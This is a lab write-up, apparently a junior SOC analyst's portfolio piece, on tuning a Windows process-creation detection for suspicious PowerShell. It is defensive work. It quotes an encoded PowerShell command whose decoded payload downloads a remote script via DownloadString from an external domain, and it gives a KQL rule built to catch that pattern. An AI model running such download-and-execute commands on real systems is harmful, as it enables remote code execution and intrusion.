# Improving Windows Security Log Detections Lab

## Overview

This project focuses on reviewing Windows Security Event Logs to identify gaps in detection logic and reduce false positives.

The goal was not to investigate a single alert, but to analyse existing log patterns and improve detection quality.

This reflects a common SOC task: tuning and strengthening alerts to improve signal-to-noise ratio.

---

## Objective

Review Event ID 4688 (Process Creation) logs and evaluate current detection logic for suspicious PowerShell activity.

Current Detection Rule:

Alert when:
- Process Name = powershell.exe

Problem:
This generates excessive false positives.

---

## Log Review Summary

Dataset reviewed:
- 50 process creation events
- 18 PowerShell executions identified

Breakdown:

- 12 legitimate administrative scripts
- 4 software installation scripts
- 1 encoded command (legitimate automation)
- 1 encoded command (suspicious)

This indicates simple "powershell.exe" detection is too broad.

---

## Analysis of False Positives

Common benign patterns observed:

1. IT patching scripts using:
   - -ExecutionPolicy Bypass
   - -File internal_script.ps1

2. Software installers invoking PowerShell silently

3. Scheduled task automation during maintenance windows

Conclusion:
ExecutionPolicy Bypass alone is not a reliable malicious indicator.

---

## Suspicious Pattern Identified

Event:

powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3...

Decoded payload:

DownloadString("http://external-update-check.com/a.ps1")

Indicators increasing suspicion:

- Encoded command
- External HTTP domain
- No matching change ticket
- Executed by temporary user account

---

## Improved Detection Logic

Instead of alerting on all PowerShell usage, refine rule to:

Alert when:
- Event ID = 4688
- Process = powershell.exe
- CommandLine contains "-enc"
AND
- CommandLine contains "DownloadString"
OR
- External network connection occurs within 60 seconds

This reduces false positives and increases confidence.

---

## Example KQL (Microsoft Sentinel)

SecurityEvent
| where EventID == 4688
| where Process has "powershell"
| where CommandLine contains "-enc"
| where CommandLine contains "DownloadString"

---

## Before vs After Detection Quality

Original Rule:
18 alerts triggered  
17 false positives  

Improved Rule:
2 alerts triggered  
1 false positive  
1 high-confidence suspicious event  

---

## MITRE ATT&CK Mapping

T1059.001 – PowerShell  
T1105 – Ingress Tool Transfer  

---

## Skills Demonstrated

- Log review methodology
- False positive identification
- Detection tuning
- Basic KQL construction
- Process creation analysis
- Defensive mindset

---

## Lessons Learned

- Broad detection rules create alert fatigue
- Context matters more than single indicators
- Encoded commands require deeper inspection
- Detection tuning improves SOC efficiency

---

## Conclusion

This exercise demonstrates foundational detection engineering thinking at a junior level.

Improving alert quality is as important as responding to incidents.
